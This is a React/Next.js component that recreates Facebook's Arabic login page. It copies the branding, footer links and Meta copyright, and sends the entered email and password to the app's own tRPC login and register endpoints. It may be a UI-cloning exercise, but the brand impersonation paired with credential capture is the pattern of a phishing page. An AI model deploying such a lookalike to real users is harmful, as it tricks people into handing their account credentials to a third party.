 "use client";

import { useState } from "react";
import { api } from "@/trpc/react";

export default function FacebookLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const loginMutation = api.auth.login.useMutation({
    onSuccess: () => {
      setMessage("تم تسجيل الدخول بنجاح");
    },
    onError: (error) => {
      setMessage(`فشل تسجيل الدخول: ${error.message}`);
    },
  });

  const registerMutation = api.auth.register.useMutation({
    onSuccess: () => {
      setMessage("تم إنشاء الحساب بنجاح");
    },
    onError: (error) => {
      setMessage(`فشل إنشاء الحساب: ${error.message}`);
    },
  });

  const isLoading = loginMutation.isPending || registerMutation.isPending;

  const handleLogin = () => {
    setMessage("");
    loginMutation.mutate({ email, password });
  };

  const handleRegister = () => {
    setMessage("");
    registerMutation.mutate({ email, password });
  };

  return (
    <div dir="rtl" className="bg-[#f0f2f5] min-h-screen flex flex-col justify-between font-[Cairo]">

      {/* MAIN */}
      <main className="flex-grow flex items-center justify-center">
        <div className="w-full max-w-6xl px-4 flex flex-col md:flex-row items-center justify-between gap-12">

          {/* RIGHT */}
          <div className="md:w-1/2 text-center md:text-right">
                        <h1
                className="text-[#1877f2] text-6xl font-extrabold mb-4"
                style={{ fontFamily: "Bebas Neue, sans-serif" }}
                >
                Facebook
                </h1>

            <p className="text-2xl text-gray-800 leading-snug">
              يمنحك فيسبوك إمكانية التواصل مع الأشخاص<br />
              ومشاركة ما تريد معهم.
            </p>
          </div>

          {/* LEFT */}
          <div className="md:w-1/2 flex justify-center">
            <div className="bg-white w-full max-w-sm rounded-lg shadow-md p-4">

              <input
                type="text"
                placeholder="البريد الإلكتروني أو رقم الهاتف"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full mb-3 px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-[#1877f2]"
              />

              <input
                type="password"
                placeholder="كلمة السر"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full mb-3 px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-[#1877f2]"
              />

                <button
                className="
                    w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-lg py-3 rounded-md
                    transition-all duration-150
                    active:scale-[0.97]
                    active:brightness-90
                    hover:shadow-md
                    cursor-pointer
                    select-none
                "
                onClick={handleLogin}
                disabled={isLoading}
                >
                {loginMutation.isPending ? "جاري تسجيل الدخول..." : "تسجيل الدخول"}
                </button>

              <a href="#" className="block text-center text-[#1877f2] text-sm mt-4 hover:underline">
                هل نسيت كلمة السر؟
              </a>

              <div className="border-t border-gray-300 my-5"></div>

              <button
                className="
                    block mx-auto bg-[#42b72a] hover:bg-[#36a420]
                    text-white font-bold text-base px-6 py-3 rounded-md
                    transition-all duration-150
                    active:scale-[0.97]
                    active:brightness-90
                    hover:shadow-md
                    cursor-pointer
                    select-none
                "
                onClick={handleRegister}
                disabled={isLoading}
                >
                {registerMutation.isPending ? "جاري إنشاء الحساب..." : "إنشاء حساب جديد"}
                </button>
              {message ? (
                <p className="mt-4 text-center text-sm text-gray-700">{message}</p>
              ) : null}
                            </div>
          </div>

        </div>
      </main>

      {/* FOOTER */}
      <footer className="bg-white text-sm text-gray-600 px-4 py-6">

        <div className="max-w-6xl mx-auto space-y-4">

          <p className="text-center">
            ‏إنشاء صفحة‏ لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.
          </p>

          <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-gray-500">
            {[
              "العربية","English (UK)","Français (France)","Italiano","Deutsch","Русский",
              "Español","Bahasa Indonesia","Türkçe","Português (Brasil)","हिन्दी"
            ].map((lang, i) => (
              <span key={i}>{lang}</span>
            ))}
          </div>

          <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs text-gray-500">
            {[
              "إنشاء حساب في فيسبوك","تسجيل الدخول","Messenger","Facebook Lite","فيديو",
              "Meta Pay","Meta Store","Meta Quest","Ray-Ban Meta","Meta AI",
              "Instagram","Threads","مركز معلومات التصويت","سياسة الخصوصية","حول",
              "إنشاء إعلان","إنشاء صفحة","المطوّرون","الوظائف","الشروط","مساعدة","الإعدادات"
            ].map((item, i) => (
              <span key={i}>{item}</span>
            ))}
          </div>

          <p className="text-center text-xs text-gray-400">
            Meta © 2026
          </p>

        </div>
      </footer>

    </div>
  );
}